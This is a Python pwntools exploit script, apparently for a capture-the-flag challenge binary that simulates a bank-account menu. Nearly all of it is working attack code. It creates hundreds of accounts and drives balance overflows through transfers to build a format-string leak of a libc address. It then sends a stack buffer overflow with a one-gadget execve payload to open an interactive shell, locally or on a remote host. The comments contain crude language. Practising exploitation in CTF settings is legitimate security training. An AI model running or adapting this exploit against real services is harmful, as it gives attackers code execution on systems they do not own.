from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./vuln"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+74
    b *main+188
    b *main+37
    b *interface+1440
'''
def init():
    # loading custom libc
    env = {"LD_PRELOAD": "./libc.so.6"}
    # loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary, env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def createACC(name):
    pp.sendline(b"1")
    pp.recvuntil(b": ")
    pp.sendline(name)
    pp.recvuntil(b"bonus.")

def readACC(idd):
    pp.sendline(b"2")
    pp.recvuntil(b"? ")
    pp.sendline(str(idd).encode())
    zebi = pp.recvuntil(b"Welcome")

def transferACC(fromx, tox, sumx):
    pp.sendline(b"3")
    pp.recvuntil(b"from? ")
    pp.sendline(str(fromx).encode())
    pp.recvuntil(b"to? ")
    pp.sendline(str(tox).encode())
    pp.recvuntil(b"transfer? ")
    pp.sendline(str(sumx).encode())
    tete = pp.recvuntil(b"Welcome")

def createCOMP(idx):
    pp.sendline(b"5")
    pp.recvuntil(b"? ")
    pp.sendline(str(idx).encode())
    pp.recvuntil(b": ")
    pp.sendline(cyclic(98))

def overflow (x, f):
    overflow = 0
    while (f != x):
        f += 1
        overflow += 1
        if (f == 0xff + 1):
            f = 0
    return (overflow)


def leak():
    pepe = [0x5f, 0x5f, 0x5f, 0x5f]
    meme = [ord("%"), ord("p")]
    i = 0
    overflowp = overflow(meme[1] , pepe[1])
    while (pepe[1] != meme[1] ):
        overflowx = overflow(0xff , pepe[0])
        while (overflowx != 0):
            pp.recvuntil(b"Interface\n")
            print(pp.recvuntil(b">")[0:2])
            if (overflowx > 35):
                transferACC(i, 128, 35)
                overflowx -= 35
            else :
                transferACC(i, 128, overflowx)
                overflowx = 0
            i += 1
        pepe[1] += 1
        pepe[0] = 0
    overflowx = overflow(meme[0] , 0xcc)
    while (overflowx != 0):
        pp.recvuntil(b"Interface\n")
        print(pp.recvuntil(b">")[0:2])
        if (overflowx > 35):
            transferACC(i, 128, 35)
            overflowx -= 35
        else :
            transferACC(i, 128, overflowx)
            overflowx = 0
        i += 1


    

def exploit():
    offset = 68
    log.info("binary loaded")
    khtek = input("attach gdb server > ")
    # we fucking segfault by giving the user an insave name then ask for a ticket and exit
    # , now all we need to do is to fucking leak
    log.warn("creating all the accounts")
    for i in range(245):
        pp.recvuntil(b">")
        createACC(b"zebi\t")
    leak()
    pp.recvuntil(b"Interface\n")
    libc.address = int(pp.recvuntil(b"_").replace(b"_", b""), 16) - 0x1bb7e3
    log.warn(f"libc base {hex(libc.address)}")
    pp.recvuntil(b">")
    libcrops = ROP(libc)
    execve = 0xe5306
    log.warn(f"libc shell one gadget {hex(libc.address + execve)}")
    payload = flat(
            b"A" * offset,
            libc.address + execve     # one gadjet lol
            )
    
    # payload = cyclic(79)
    print(len(payload))
    createACC(payload)
    pp.recvuntil(b">")
    createCOMP(245)
    pp.recvuntil(b">")
    pp.sendline(b"6")


    pp.interactive()

libc = ELF("./libc.so.6")
# libc = ELF("/usr/lib/libc.so.6")
elf = context.binary = ELF(binary)
pp = init()
exploit()
# 0x55f5d6e802b0        // sep
# 0x55f5d6e80ea0        // accs
# 3048
